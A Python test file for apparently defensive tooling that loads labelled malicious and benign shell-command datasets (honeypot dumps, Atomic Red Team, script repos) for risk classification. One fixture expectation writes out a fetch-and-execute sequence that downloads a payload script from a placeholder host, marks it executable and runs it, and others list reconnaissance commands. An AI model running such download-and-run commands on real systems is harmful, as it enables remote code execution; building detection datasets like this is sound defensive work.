from __future__ import annotations

import json
import zipfile
from pathlib import Path

from cmdrisk.data.adapters import (
    AtomicRedTeamAdapter,
    MicrosoftIoTAdapter,
    ScriptRepoAdapter,
    ShellAttackEvolutionAdapter,
    ZenodoAdapter,
)
from cmdrisk.schema import SourceKind

FIXTURES = Path(__file__).parent / "fixtures" / "data"


def test_microsoft_json_adapter_preserves_provenance() -> None:
    records = list(MicrosoftIoTAdapter().iter_records(FIXTURES / "microsoft_iot.json"))

    assert len(records) == 2
    assert records[0].source.kind == SourceKind.REAL_MALICIOUS
    assert records[0].label.malicious == 1
    assert len(records[0].commands) == 5
    assert records[0].meta["TimesSeen"] == 17
    assert records[0].meta["raw_commands"][2].startswith("curl")


def test_microsoft_zip_adapter_supports_encrypted_archive(tmp_path: Path) -> None:
    archive_path = tmp_path / "sample.zip"
    payload = json.dumps([{"ID": "zip-1", "Commands": ["whoami", "id"]}]).encode()
    with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.setpassword(b"infected")
        archive.writestr("Microsoft.IoT-Dump1.json", payload)

    first = list(MicrosoftIoTAdapter().iter_records(archive_path, password="infected"))
    second = list(MicrosoftIoTAdapter().iter_records(archive_path, password="infected"))

    assert len(first) == 1
    assert [event.cmd for event in first[0].commands] == ["whoami", "id"]
    assert first[0].session_id == second[0].session_id


def test_shell_attack_evolution_adapters_handle_sessions_and_cowrie_events() -> None:
    sessions = list(
        ShellAttackEvolutionAdapter().iter_records(FIXTURES / "shell_attack_evolution.json")
    )
    events = list(
        ShellAttackEvolutionAdapter().iter_records(
            FIXTURES / "shell_attack_evolution_cowrie.jsonl"
        )
    )

    assert len(sessions) == 2
    assert sessions[0].label.techniques == ["T1082", "T1105", "T1222", "T1059.004"]
    assert sessions[1].label.techniques == ["T1053.003"]
    assert len(events) == 1
    assert [event.cmd for event in events[0].commands] == ["uname -s -v -n -r -m", "id"]
    assert events[0].meta["cowrie_event_count"] == 2


def test_zenodo_adapter_reconstructs_sessions_by_context_and_gap() -> None:
    records = list(ZenodoAdapter(gap_seconds=300).iter_records(FIXTURES / "zenodo.jsonl"))

    assert len(records) == 3
    assert [len(record.commands) for record in records] == [2, 1, 2]
    assert all(record.source.kind == SourceKind.REAL_BENIGN for record in records)
    assert all(record.meta["requires_teacher_review"] for record in records)
    assert records[0].commands[1].dt == 5.0
    assert records[1].meta["sandbox_id"] == "396"


def test_atomic_adapter_expands_linux_placeholders() -> None:
    records = list(AtomicRedTeamAdapter().iter_records(FIXTURES / "atomic.yaml"))

    assert len(records) == 1
    assert [event.cmd for event in records[0].commands] == [
        "curl -sS https://example.invalid/payload.sh -o /tmp/payload.sh",
        "chmod +x /tmp/payload.sh",
        "/tmp/payload.sh",
    ]
    assert records[0].label.techniques == ["T1059.004"]
    assert records[0].meta["executor"] == "sh"


def test_script_repo_adapter_extracts_all_supported_file_types() -> None:
    records = list(ScriptRepoAdapter().iter_records(FIXTURES / "scripts" / "repo"))
    by_category = {record.meta["script_category"]: record for record in records}

    assert set(by_category) == {"ansible", "dockerfile", "github_actions", "kubernetes", "shell"}
    assert by_category["dockerfile"].commands[0].cmd.startswith("pip install")
    assert any("pytest" in command.cmd for command in by_category["github_actions"].commands)
    assert by_category["kubernetes"].commands[0].cmd == "/bin/sh -c python -m http.server 8080"
    assert all(record.source.kind == SourceKind.SCRIPT_BENIGN for record in records)
    assert all(record.label.malicious == 0 for record in records)
